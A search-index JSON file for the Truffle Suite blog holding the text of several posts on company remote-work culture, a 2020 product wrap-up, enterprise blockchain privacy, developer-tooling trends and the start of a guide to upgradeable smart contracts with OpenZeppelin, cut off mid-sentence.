{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"","title":"Home"},{"location":"404.html","text":"","title":"Truffle Suite"},{"location":"ipfs-404.html","text":"","title":"Truffle Suite"},{"location":"blog/index.html","text":"","title":"Truffle Suite Blog"},{"location":"blog/10-things-we-dont-do-that-make-working-at-truffle-awesome/index.html","text":"At Truffle we have an extremely tight-knit team. You'll see that at this year's TruffleCon, a conference for hundreds of attendees organized by only a handful of people. We often have more work than we can handle, yet we take it on because we love the work we're doing and we love the people we work with. In my history of hopping startups \u2013 I'm currently on number nine \u2013 I haven't seen this anywhere else, so I wanted to take the time to highlight some things that set Truffle apart from the rest. Here's a list of what we don't do that makes working at Truffle awesome: We don't have an office. This is the most important point, as it permeates the makeup and structure of our organization. We have members all over the US and Canada. I live in Yakima, WA, of all places, known more for apples and hops than for tech and blockchain. For communication efficiency we intentionally hired within US time zones, but we realize remote work means there's no office to clock into. We currently have team members working from China, Japan and Germany, following the path their family and personal lives have taken them, while still remaining valuable members of the team. We don't clock in. For most of our team, working remotely means working from home. Often our home life and work life are intertwined, and we know that on some days work wins (i.e., I'm writing this the morning of July 4th, a holiday in the United States), and on other days life wins. This means a flexible schedule is absolutely required. Often, I tell my team to add their life events to their work calendar, like taking their dog to the vet or their kids to school, to ensure work doesn't encroach on the needs of their home life. We don't track vacation time. Our vacation policy is unlimited: We take whatever time we need. This is important to our work/life balance, and it also ensures our team gets much-needed breaks. Over time we've perfected this policy by engaging work and life into a little quid pro quo: If you let your coworkers know about your time off in advance, and you ensure your work is completed and fully handed off to another team member while you're away, then the time is yours. (Emergencies, of course, aren't governed by this policy.) This has worked surprisingly well. Recently a coworker \"sipped bevvies\" in the Bahamas for a week and a half, and his team happily held their own while he was on vacation. We all recognize that we're working extremely hard, so we all want to step in when others need a break. We don't let people burn out. Burn out can be a huge you-know-what. It comes on quick, often sneaking in at the tail end of an intense work effort where life lost out one too many times. It also comes when a striking life event seeps into our work life. It's an energy killer, and a turnover monster out to eat up all our employees. We don't let it eat us. After our first burn out event caused one of our best developers to leave, we created a company policy called the Get Out of Burn Out Free Card. When played, it gives the team member two weeks of vacation starting immediately, no questions asked. It's up to the rest of the team to pick up the slack, and find creative solutions in the team member's absence. It's not a card that gets played often, but it's been played a few times since and we've saved valuable team members from throwing in the towel. Even if the card never gets played, it's reassuring to know other members of the team have our backs in times of need. We don't wear business attire. We work from home, which means we wear the attire we'd normally wear at home. I'm known for wearing pajamas, often brightly colored ones, even during business calls. At the very least, professionalism only matters to the eye of the webcam, and anything out of frame is totally fair game. And heck, we're working hard, so we want to be comfortable. We don't stay remote. Though video calls and Slack messages are our main source of communication, we know nothing builds a relationship better than real human connection. That's why we plan full company retreats three to four times a year, to exciting places that help us all become closer. Our most recent retreat took us to the snowy mountains of Breckinridge, CO. Yes, it was super cold outside and the air was hard to breathe, but it was a new experience for all of us and we came out with some interesting stories to tell. My most memorable moment was when I commandeered a sled and careened right off the side of a hill. Lucky for me it was a false slope and I had no injuries, though my team certainly got a good laugh. We don't try to be fully flat. We love the egalitarian nature of flat organizations, but we also love the efficiency of explicit hierarchy. In our experience flat organizations push hierarchy under the surface, turning decision-making into a confusing game of personal politics and popularity contests. Instead, we take a hybrid approach. We accept that hierarchy exists in our organization, but we try to make it as flat as possible. We push decisions as far down in the hierarchy as they can go, so each team member feels empowered to do the best work possible, and we clearly define the decisions that each role can make. As the CEO of Truffle, I get to make decisions on money and resources, but I'm also the founder, which means I once touched every line of code. That's now Nick D'Andrea's job, our head of engineering, and the jobs of the engineers leading each of our individual engineering projects. We don't leave people hanging. Having a light hierarchy gives us the ability to appoint leads. Leads are sometimes a vehicle for accountability, like managers in traditional organizations, but most of the time they're there to serve the members of our team. Every team member gets a lead, and gets a weekly one-on-one that they can use any way they like. Often these one-on-ones are used as a regular place to vent: they help us catch issues early and provide team members a useful outlet so small issues don't turn into something bigger. Leads go to bat for their team members when the team member doesn't feel comfortable raising an issue themselves. We don\u2019t give in to perfect. At least, not initially. In our organization, perfect is the enemy of the good. Had I not been writing this on Independence Day, I may have shot for ten items to round out the list instead of nine. Similarly, it\u2019s the same reason we release a new version of Truffle weekly: We like to bring value to users as quickly as possible, and then strive towards perfection iteratively over time. This idea governs all the work that we do, from software to sales to even our VC pitch decks, because we realize the feedback we get from users far outweighs our initial ideas at perfection. If you have thoughts on how we can better improve our blog or this blog post, please send me an email at tim@trufflesuite.com. See #9. Working at Truffle has been an amazing journey. It's incredibly humbling to see a project I started from necessity turn into a company run by the heart and soul of a close, tight-knit group of professionals. Truffle would be nothing without this team, and without Truffle I'd likely not be excited to go to work every morning (I commute downstairs in my pajamas, but still). Thank you, Truffle team, for making this company awesome.","title":"10 Things We Don't Do That Make Working at Truffle Awesome"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html","text":"2020 has been a trying time for us all: COVID-19 is still ravaging the world, the United States mired through one of our most contentious elections yet; basically, it\u2019s been a rough year. It\u2019s not all bad though! Let\u2019s take a look back at some positive things that came out of 2020, along with a little of what to look forward to in 2021. A Look Back \u00b6 ConsenSys Fold-in \u00b6 This year was a busy one for Truffle, but the biggest news squeaked in just in time for the end of the year: Truffle is now a part of ConsenSys! We\u2019re excited to collaborate with Infura, MythX, MetaMask, and more! Teams Enhancements \u00b6 It was also a big year for Truffle Teams. We\u2019ve added new features and enhanced existing ones to complete the core workflow Truffle Teams offers (I summarize this in our final Dapp Lifecycle webinar episode here). Big highlights include the release of: Dashboard ( Blog | Docs ): More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Truffle Teams new dashboard provides an overview of your application, along with ways to drill down and get further context on more narrow slices. Debugger ( Blog | Docs ): This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Early Access ( Blog ): Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Deployment and Monitoring Improvements ( Blog | Docs ): We\u2019ve added a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. Before the end of this year, we\u2019ll be releasing the Contract Manager to Early Access, completing the workflow and allowing teams to build, deploy, monitor, and debug conveniently in one place. Truffle\u2019s Unstoppable Release Schedule \u00b6 Going on 2 years now, Truffle has released on a weekly basis. We\u2019re so proud of our team for their hard work and commitment to improving the lives of other developers. We don\u2019t have any plans to stop this cadence--full steam ahead for the Truffle train! Debugger and Test Enhancements \u00b6 2020 saw great improvements to Truffle, including debugging verified contracts with truffle debug --fetch-external ( Blog ), support for stacktraces in tests with truffle test --stacktrace ( Blog ), and even freshly-added support for stepping through Vyper contracts! Forking in Ganache \u2013 much improved! \u00b6 Since the summer of 2020 saw DeFi reach a whole new level of usage, more and more people have been looking to test their code against live smart contracts on-chain. Ganache has always had its --fork option, but thanks to members of the community, we\u2019ve fixed more than half a dozen critical bugs that inhibited certain use cases. Forking is more reliable than ever! Collaborations \u00b6 2020 was a year of partnerships for Truffle, seeing us make good on the vision to become a multi-blockchain toolset. Tezos ( Blog | Docs ): Tezos is supported in Truffle! Many of the commands you\u2019re used to are still here: compile, deploy, test, and console! Corda ( Blog | Docs ): Ganache UI supports creating Corda networks! Easily create and introspect into a local Corada development network with a familiar UI. Filecoin ( Blog ): Truffle Preserve allows you to easily preserve files on IPFS and/or Filecoin. A Look Forward \u00b6 Continued Maturation of Truffle Teams \u00b6 Truffle Teams will continue to be enhanced throughout 2021, with useful additions such as: Monitoring enhancements : receive alerts when we observe contract anomalies, such as a sudden spike in failed transactions or a drop in balance. Set up your own custom triggers for things like an event firing or a certain address interacting with your contracts. Debugging public transactions : The debugger only works for sandboxes currently, but we want to bring it to feature parity with the CLI debugger by also supporting public networks. Custom Network Support : Deploy via your own infrastructure by supplying the RPC URL. Put your DappNode to good use! Continuous (Automated) Deployment : You can already deploy manually via Truffle Team\u2019s deployment wizard, but there may be times you know you\u2019ll be continuously deploying your changes. For example iterating on a new feature in a sandbox. Better Dashboard : The dashboard today provides a good overview of your deployment, but we\u2019re going to expand it to provide better drill down functionality and greater context. Advanced Analysis \u00b6 Truffle\u2019s been around for over 5 years now. In that time, we\u2019ve been thinking about how smart contract systems grow and change over time. Be on the lookout for tools to better examine your contract\u2019s deployment history, track contracts across forks, and more! Ganache Rewrite \u00b6 Ganache is getting a tune-up! This means faster execution of your test suites-- 4x faster in the case of SushiSwap\u2019s test suite. Also lookout for ways to test pending transactions, implementation of EIP-1193, the ability to set the account nonce ( evm_setAccountNonce ), and support for running Ganache in the browser. We\u2019ll also begin publishing auto-generated API documentation so you always have a reference close at hand. The Return of the Frontend \u00b6 2020 didn\u2019t see much movement in our set of frontend libraries, Drizzle . In 2021 we\u2019ll be giving some love to the frontend in the form of easier state management, more granular tooling, and more. More Collaborations \u00b6 As mentioned above, now that we\u2019re a part of ConsenSys Software Inc, Truffle's going to have many opportunities to collaborate with other groups. We\u2019d love to hear what this sparks in you! Check out our Slack group below and let us know your thoughts. Here are some links to CSI\u2019s groups so you know what they\u2019re about: Infura MythX ConsenSys Diligence MetaMask CodeFi ConsenSys Quorum Catch us on Slack \u00b6 We want Truffle the best developer tool suite in the blockchain space for new and seasoned devs alike. Let us know what you think about our plans, or if you/your team have other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Product Lead & The Whole Team at Truffle","title":"2020 is Finally Over - A Year End Wrapup"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#a-look-back","text":"","title":"A Look Back"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#consensys-fold-in","text":"This year was a busy one for Truffle, but the biggest news squeaked in just in time for the end of the year: Truffle is now a part of ConsenSys! We\u2019re excited to collaborate with Infura, MythX, MetaMask, and more!","title":"ConsenSys Fold-in"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#teams-enhancements","text":"It was also a big year for Truffle Teams. We\u2019ve added new features and enhanced existing ones to complete the core workflow Truffle Teams offers (I summarize this in our final Dapp Lifecycle webinar episode here). Big highlights include the release of: Dashboard ( Blog | Docs ): More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Truffle Teams new dashboard provides an overview of your application, along with ways to drill down and get further context on more narrow slices. Debugger ( Blog | Docs ): This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Early Access ( Blog ): Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Deployment and Monitoring Improvements ( Blog | Docs ): We\u2019ve added a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. Before the end of this year, we\u2019ll be releasing the Contract Manager to Early Access, completing the workflow and allowing teams to build, deploy, monitor, and debug conveniently in one place.","title":"Teams Enhancements"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#truffles-unstoppable-release-schedule","text":"Going on 2 years now, Truffle has released on a weekly basis. We\u2019re so proud of our team for their hard work and commitment to improving the lives of other developers. We don\u2019t have any plans to stop this cadence--full steam ahead for the Truffle train!","title":"Truffle\u2019s Unstoppable Release Schedule"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#debugger-and-test-enhancements","text":"2020 saw great improvements to Truffle, including debugging verified contracts with truffle debug --fetch-external ( Blog ), support for stacktraces in tests with truffle test --stacktrace ( Blog ), and even freshly-added support for stepping through Vyper contracts!","title":"Debugger and Test Enhancements"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#forking-in-ganache-much-improved","text":"Since the summer of 2020 saw DeFi reach a whole new level of usage, more and more people have been looking to test their code against live smart contracts on-chain. Ganache has always had its --fork option, but thanks to members of the community, we\u2019ve fixed more than half a dozen critical bugs that inhibited certain use cases. Forking is more reliable than ever!","title":"Forking in Ganache \u2013 much improved!"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#collaborations","text":"2020 was a year of partnerships for Truffle, seeing us make good on the vision to become a multi-blockchain toolset. Tezos ( Blog | Docs ): Tezos is supported in Truffle! Many of the commands you\u2019re used to are still here: compile, deploy, test, and console! Corda ( Blog | Docs ): Ganache UI supports creating Corda networks! Easily create and introspect into a local Corada development network with a familiar UI. Filecoin ( Blog ): Truffle Preserve allows you to easily preserve files on IPFS and/or Filecoin.","title":"Collaborations"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#a-look-forward","text":"","title":"A Look Forward"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#continued-maturation-of-truffle-teams","text":"Truffle Teams will continue to be enhanced throughout 2021, with useful additions such as: Monitoring enhancements : receive alerts when we observe contract anomalies, such as a sudden spike in failed transactions or a drop in balance. Set up your own custom triggers for things like an event firing or a certain address interacting with your contracts. Debugging public transactions : The debugger only works for sandboxes currently, but we want to bring it to feature parity with the CLI debugger by also supporting public networks. Custom Network Support : Deploy via your own infrastructure by supplying the RPC URL. Put your DappNode to good use! Continuous (Automated) Deployment : You can already deploy manually via Truffle Team\u2019s deployment wizard, but there may be times you know you\u2019ll be continuously deploying your changes. For example iterating on a new feature in a sandbox. Better Dashboard : The dashboard today provides a good overview of your deployment, but we\u2019re going to expand it to provide better drill down functionality and greater context.","title":"Continued Maturation of Truffle Teams"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#advanced-analysis","text":"Truffle\u2019s been around for over 5 years now. In that time, we\u2019ve been thinking about how smart contract systems grow and change over time. Be on the lookout for tools to better examine your contract\u2019s deployment history, track contracts across forks, and more!","title":"Advanced Analysis"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#ganache-rewrite","text":"Ganache is getting a tune-up! This means faster execution of your test suites-- 4x faster in the case of SushiSwap\u2019s test suite. Also lookout for ways to test pending transactions, implementation of EIP-1193, the ability to set the account nonce ( evm_setAccountNonce ), and support for running Ganache in the browser. We\u2019ll also begin publishing auto-generated API documentation so you always have a reference close at hand.","title":"Ganache Rewrite"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#the-return-of-the-frontend","text":"2020 didn\u2019t see much movement in our set of frontend libraries, Drizzle . In 2021 we\u2019ll be giving some love to the frontend in the form of easier state management, more granular tooling, and more.","title":"The Return of the Frontend"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#more-collaborations","text":"As mentioned above, now that we\u2019re a part of ConsenSys Software Inc, Truffle's going to have many opportunities to collaborate with other groups. We\u2019d love to hear what this sparks in you! Check out our Slack group below and let us know your thoughts. Here are some links to CSI\u2019s groups so you know what they\u2019re about: Infura MythX ConsenSys Diligence MetaMask CodeFi ConsenSys Quorum","title":"More Collaborations"},{"location":"blog/2020-is-finally-over-a-year-end-wrapup/index.html#catch-us-on-slack","text":"We want Truffle the best developer tool suite in the blockchain space for new and seasoned devs alike. Let us know what you think about our plans, or if you/your team have other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Product Lead & The Whole Team at Truffle","title":"Catch us on Slack"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html","text":"Blockchain has been touted as the great connector to integrate businesses under consortium networks . It\u2019s ability to verify data using smart contracts and provide transparency across network participants through immutable shared data has people talking about a technical revolution. However, this benefit has been a double-edged sword because the enterprise world is skeptical about sharing sensitive data on a ledger where the information cannot be deleted. The good news is, this year has seen numerous announcements of single and multi-party blockchain pilots by the Fortune 500 such as\u2026 Starbucks and MetLife . Data privacy issues haven\u2019t stopped them and the enterprise blockchain world has taken these steps to shift their thinking. 1. Store references to data on the blockchain \u00b6 The simplest way to circumvent this data privacy issue is to not put the data on the chain. A popular approach is to share anonymous IDs on the blockchain and use that to get data from another system. For example, MediLedger is a supply chain pilot in the heavily regulated pharmaceutical industry that uses a blockchain to trace a drug\u2019s exchange of hands and then uses another private peer-to-peer application to transfer details about the medication. What is passed around on the chain is just an anonymous identifier to the medication. This keeps transactions light, allows enterprises to regulate data access, and uses proven methods to secure sensitive data. MediLedger actually takes this a step further and anonymizes the transaction details with zero knowledge proofs \u2014 which I\u2019ll cover later. 2. Use blockchains to verify instead of share \u00b6 Blockchain\u2019s real power is in its ability to verify data. Instead of putting actual information on the chain, a solution could combine unique elements of data and share a hash of it on the blockchain. Hashing is a cryptographic method that generates a random, unique value from a fed input. In this scenario, the resulting hash itself doesn\u2019t reveal any information, but it can verify an on-hand document by checking if it generates the same hash when fed into the function. The data inputs could also be selected in a way that no critical information is sampled to create the hash so that compliance regulations can be withheld. Businesses have reliable methods to exchange data, but the verification is long and expensive. By using blockchain as a verifier and not the store of the data, we can ease the pain point and maintain a higher level of privacy than open sharing. 3. Anonymize transactions with zero knowledge proofs \u00b6 Building off the two previous trends, blockchain pilots have taken an extra step in securing data and replaced hashed transaction details with zero knowledge proofs (ZKP). ZKPs allow for verification of a transaction without exposing transaction details . Now two businesses can communicate on a public network and be completely anonymous. This is because what is placed on the chain is a proof that is cryptographically verified by the receiver, not the data that goes into the transaction. This shift in data validation methods addresses data privacy concerns and supports industry consortiums. Blockchain is just one piece of the puzzle \u00b6 Finally, with all the hype on blockchain\u2019s potential in the last years, we have to remember that this is just another tool in the technology box when solving a problem. Enterprises have gotten smarter in finding ways to use blockchain to solve unique problems that are more expensive or less reliable with other technologies. What we have seen is that distributed ledgers can\u2019t do everything, but when paired with multiple other technologies that help fill gaps, the solution as a whole is optimized. A better perspective is to not think of future solutions as blockchain applications, but rather applications that leverage the unique advantages of blockchain. About West Monroe Partners \u00b6 West Monroe is a national business and technology consulting firm that partners with dynamic organizations to reimagine, build, and operate their businesses at peak performance. Our team of more than 1,400 professionals across nine offices is comprised of an uncommon blend of business consultants and deep technologists. I am one of those consultants and I am one of the leaders of our blockchain center of excellence. I\u2019ll be presenting on Sunday morning (8/4) about one of our blockchain projects that looks to incentivize electric vehicle owners to charge with cleaner energy . Check us out at our website and read more about our blockchain perspectives on our blog! Danny Pan is a consultant with West Monroe Partner\u2019s Seattle Technology Practice. He focuses on providing value in adopting blockchain, distributed technologies, and robust SDLC practices. Contact Danny at dpan@wmp.com","title":"3 Ways Enterprises Are Addressing Blockchain Privacy Concerns"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html#1-store-references-to-data-on-the-blockchain","text":"The simplest way to circumvent this data privacy issue is to not put the data on the chain. A popular approach is to share anonymous IDs on the blockchain and use that to get data from another system. For example, MediLedger is a supply chain pilot in the heavily regulated pharmaceutical industry that uses a blockchain to trace a drug\u2019s exchange of hands and then uses another private peer-to-peer application to transfer details about the medication. What is passed around on the chain is just an anonymous identifier to the medication. This keeps transactions light, allows enterprises to regulate data access, and uses proven methods to secure sensitive data. MediLedger actually takes this a step further and anonymizes the transaction details with zero knowledge proofs \u2014 which I\u2019ll cover later.","title":"1. Store references to data on the blockchain"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html#2-use-blockchains-to-verify-instead-of-share","text":"Blockchain\u2019s real power is in its ability to verify data. Instead of putting actual information on the chain, a solution could combine unique elements of data and share a hash of it on the blockchain. Hashing is a cryptographic method that generates a random, unique value from a fed input. In this scenario, the resulting hash itself doesn\u2019t reveal any information, but it can verify an on-hand document by checking if it generates the same hash when fed into the function. The data inputs could also be selected in a way that no critical information is sampled to create the hash so that compliance regulations can be withheld. Businesses have reliable methods to exchange data, but the verification is long and expensive. By using blockchain as a verifier and not the store of the data, we can ease the pain point and maintain a higher level of privacy than open sharing.","title":"2. Use blockchains to verify instead of share"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html#3-anonymize-transactions-with-zero-knowledge-proofs","text":"Building off the two previous trends, blockchain pilots have taken an extra step in securing data and replaced hashed transaction details with zero knowledge proofs (ZKP). ZKPs allow for verification of a transaction without exposing transaction details . Now two businesses can communicate on a public network and be completely anonymous. This is because what is placed on the chain is a proof that is cryptographically verified by the receiver, not the data that goes into the transaction. This shift in data validation methods addresses data privacy concerns and supports industry consortiums.","title":"3. Anonymize transactions with zero knowledge proofs"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html#blockchain-is-just-one-piece-of-the-puzzle","text":"Finally, with all the hype on blockchain\u2019s potential in the last years, we have to remember that this is just another tool in the technology box when solving a problem. Enterprises have gotten smarter in finding ways to use blockchain to solve unique problems that are more expensive or less reliable with other technologies. What we have seen is that distributed ledgers can\u2019t do everything, but when paired with multiple other technologies that help fill gaps, the solution as a whole is optimized. A better perspective is to not think of future solutions as blockchain applications, but rather applications that leverage the unique advantages of blockchain.","title":"Blockchain is just one piece of the puzzle"},{"location":"blog/3-ways-enterprises-are-addressing-blockchain-privacy-concerns/index.html#about-west-monroe-partners","text":"West Monroe is a national business and technology consulting firm that partners with dynamic organizations to reimagine, build, and operate their businesses at peak performance. Our team of more than 1,400 professionals across nine offices is comprised of an uncommon blend of business consultants and deep technologists. I am one of those consultants and I am one of the leaders of our blockchain center of excellence. I\u2019ll be presenting on Sunday morning (8/4) about one of our blockchain projects that looks to incentivize electric vehicle owners to charge with cleaner energy . Check us out at our website and read more about our blockchain perspectives on our blog! Danny Pan is a consultant with West Monroe Partner\u2019s Seattle Technology Practice. He focuses on providing value in adopting blockchain, distributed technologies, and robust SDLC practices. Contact Danny at dpan@wmp.com","title":"About West Monroe Partners"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html","text":"In this article we explore 5 trends impacting the developer-experience (or DX) when it comes to building blockchain-based solutions. Specifically, applications and services that leverage a blockchain or distributed ledger or as part of their overall architecture. This is, of course, is by no means a definitive list. As with everything in the industry, change is happening fast and as such, this is more of a selection of trends that are on the team\u2019s radar. If there\u2019s anything we\u2019ve missed or should know about, we\u2019d love to hear from you (or speak in person at TruffleCon 2019 ). #1 Development tooling release velocity is on fire \u00b6 Obviously we\u2019re a little biased, but in this case, we\u2019re talking about tools and utilities that are not chocolate-themed . It\u2019s literally every day we collectively come across something new that makes our lives as developers (or users, auditors, admins, etc) easier. This is a big deal for the long-term success of the wider ecosystem because happy and productive developers obviously strongly correlates with increased experimentation, the volume of shipped products and services, and expedites the process of on-boarding new people (developers or otherwise) into the blockchain space. At Truffle, we\u2019re also pushing harder than ever to make the DX as sweet as possible. Like, raspberry truffle sweet. This includes new features and enhancements to the existing suite (such as integration with Hyperledger Fabric's chaincode EVM ), as well as the upcoming Truffle DB and Truffle Teams . #2 Managed Blockchain Services are here \u00b6 Managed Blockchain Services (MBS) are evolving rapidly. In the first half of 2019 alone we\u2019ve seen the launch of new services from heavyweights such as Microsoft and Amazon , and players such as Kaleido evolving their stack with dizzying speed. These services, of course, do all the heavy lifting when it comes to spinning up private or consortium networks, something that was historically cumbersome from a DevOps perspective. Excitingly, the maturation of these services is coinciding with an increased understanding of the use-cases for permissioned ledgers and accordingly, we\u2019re seeing major projects and initiatives begin to roll out. The managed nature of these services has allowed the teams behind them to really focus on streamlining the developer experience Which leads us to the next trend... #3 We\u2019re seeing glimpses of the DX of the future \u00b6 In the words of William Gibson: \u201cThe future is already here - it's just not very evenly distributed\u201d and with the blockchain DX it\u2019s no different. Our favorite example of a DX from the future is Kaleido\u2019s Marketplace where within a few clicks you can add a token swap service , store data on IPFS , or pin a state proof to a public network. It\u2019s almost too easy. Seriously though, this evolution of developer experiences paves the way for how \u201cdelightful\u201d things might one-day be when building equivalent services for public networks. #4 Major corporations are pushing some seriously awesome open-source software \u00b6 While veteran projects like OpenZeppelin continue to blossom, one interesting trend we\u2019ve seen is larger organizations\u2019 increasing embrace of open-source with the recent release of some exciting new projects. Some great examples of this include Ernst & Young\u2019s Nightfall , Samsung\u2019s Blockchain SDK , Microsoft\u2019s Confidential Consortium Framework , and the continued evolution of the JPMorgan-backed Quorum . We\u2019re equally pumped by the launch of Cloudflare\u2019s Ethereum gateway too! It\u2019s exciting to see companies of all shapes and sizes embracing the paradigm in ways that we can all benefit. #5 Industries are becoming increasingly programmable, led by DeFi \u00b6 While companies like Stripe have turned programming against \u201ccentralized\u201d finance into an art form, they are inherently bound by the rules and regulations imposed by the industry itself. Decentralized Finance (or DeFi) on the other hand has no such intrinsic limitations. Want to open a Collateralized Debt Position? MakerDAO has a JavaScript library for that. DeFi is only limited by the imagination (and programming ability) of individual developers. We\u2019re rapidly seeing the decentralized equivalent of swaths of traditional financial services emerge, all of which are open and programmable in ways that the existing industry can only dream of. And of course it goes far beyond finance. Everything from supply chains to in-game assets are steadily turning Ethereum into the \u201c global platform for every asset \u201d. It\u2019s never been a better time to building on Ethereum. From tooling to infrastructure to a world-class open-source ecosystem, the developer-experience continues to blossom.","title":"5 Trends Impacting the Blockchain Developer Experience"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html#1-development-tooling-release-velocity-is-on-fire","text":"Obviously we\u2019re a little biased, but in this case, we\u2019re talking about tools and utilities that are not chocolate-themed . It\u2019s literally every day we collectively come across something new that makes our lives as developers (or users, auditors, admins, etc) easier. This is a big deal for the long-term success of the wider ecosystem because happy and productive developers obviously strongly correlates with increased experimentation, the volume of shipped products and services, and expedites the process of on-boarding new people (developers or otherwise) into the blockchain space. At Truffle, we\u2019re also pushing harder than ever to make the DX as sweet as possible. Like, raspberry truffle sweet. This includes new features and enhancements to the existing suite (such as integration with Hyperledger Fabric's chaincode EVM ), as well as the upcoming Truffle DB and Truffle Teams .","title":"#1 Development tooling release velocity is on fire"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html#2-managed-blockchain-services-are-here","text":"Managed Blockchain Services (MBS) are evolving rapidly. In the first half of 2019 alone we\u2019ve seen the launch of new services from heavyweights such as Microsoft and Amazon , and players such as Kaleido evolving their stack with dizzying speed. These services, of course, do all the heavy lifting when it comes to spinning up private or consortium networks, something that was historically cumbersome from a DevOps perspective. Excitingly, the maturation of these services is coinciding with an increased understanding of the use-cases for permissioned ledgers and accordingly, we\u2019re seeing major projects and initiatives begin to roll out. The managed nature of these services has allowed the teams behind them to really focus on streamlining the developer experience Which leads us to the next trend...","title":"#2 Managed Blockchain Services are here"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html#3-were-seeing-glimpses-of-the-dx-of-the-future","text":"In the words of William Gibson: \u201cThe future is already here - it's just not very evenly distributed\u201d and with the blockchain DX it\u2019s no different. Our favorite example of a DX from the future is Kaleido\u2019s Marketplace where within a few clicks you can add a token swap service , store data on IPFS , or pin a state proof to a public network. It\u2019s almost too easy. Seriously though, this evolution of developer experiences paves the way for how \u201cdelightful\u201d things might one-day be when building equivalent services for public networks.","title":"#3 We\u2019re seeing glimpses of the DX of the future"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html#4-major-corporations-are-pushing-some-seriously-awesome-open-source-software","text":"While veteran projects like OpenZeppelin continue to blossom, one interesting trend we\u2019ve seen is larger organizations\u2019 increasing embrace of open-source with the recent release of some exciting new projects. Some great examples of this include Ernst & Young\u2019s Nightfall , Samsung\u2019s Blockchain SDK , Microsoft\u2019s Confidential Consortium Framework , and the continued evolution of the JPMorgan-backed Quorum . We\u2019re equally pumped by the launch of Cloudflare\u2019s Ethereum gateway too! It\u2019s exciting to see companies of all shapes and sizes embracing the paradigm in ways that we can all benefit.","title":"#4 Major corporations are pushing some seriously awesome open-source software"},{"location":"blog/5-trends-impacting-the-blockchain-developer-experience/index.html#5-industries-are-becoming-increasingly-programmable-led-by-defi","text":"While companies like Stripe have turned programming against \u201ccentralized\u201d finance into an art form, they are inherently bound by the rules and regulations imposed by the industry itself. Decentralized Finance (or DeFi) on the other hand has no such intrinsic limitations. Want to open a Collateralized Debt Position? MakerDAO has a JavaScript library for that. DeFi is only limited by the imagination (and programming ability) of individual developers. We\u2019re rapidly seeing the decentralized equivalent of swaths of traditional financial services emerge, all of which are open and programmable in ways that the existing industry can only dream of. And of course it goes far beyond finance. Everything from supply chains to in-game assets are steadily turning Ethereum into the \u201c global platform for every asset \u201d. It\u2019s never been a better time to building on Ethereum. From tooling to infrastructure to a world-class open-source ecosystem, the developer-experience continues to blossom.","title":"#5 Industries are becoming increasingly programmable, led by DeFi"},{"location":"blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/index.html","text":"Immutability is a cornerstone of blockchain technology. This is great for many reasons, but presents a problem when it\u2019s time to upgrade our smart contracts. There are a few different upgrade patterns, but one that\u2019s proven to be robust is the proxy pattern. This pattern has, until now, involved some additional overhead for development teams. Thanks to OpenZeppelin though, you can now deploy upgradeable contract systems with ease using the familiar Truffle tool suite! The Proxy Pattern \u00b6 At a high level, the proxy upgrade pattern involves deploying a proxy contract that delegates function calls to your logic and storage contracts. The proxy is storing addresses of the logic contracts and these addresses can be changed. This allows you to deploy a new version of the logic contract and point the proxy to that new version. The proxy contract can point to any number of different logic contracts. There are many concerns around this pattern you\u2019ll need to keep in mind, such as making sure your old contracts cannot be used maliciously. For more information on proxy patterns, check out OpenZeppelin\u2019s proxy pattern guide . Using the Plugin \u00b6 First, install the package: npm install --save-dev @openzeppelin/truffle-upgrades Note : This package requires Truffle version 5.1.35 or greater. Then, in your migration script, use the new deployProxy and upgradeProxy functions: const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const Box = artifacts . require ( 'Box' ); const BoxV2 = artifacts . require ( 'BoxV2' ); module . exports = async function ( deployer ) { const instance = await deployProxy ( Box , [ 42 ], { deployer }); const upgraded = await upgradeProxy ( instance . address , BoxV2 , { deployer }); } Now your contract systems can be much more flexible while still leveraging all of the benefits of a blockchain network. For more information on the 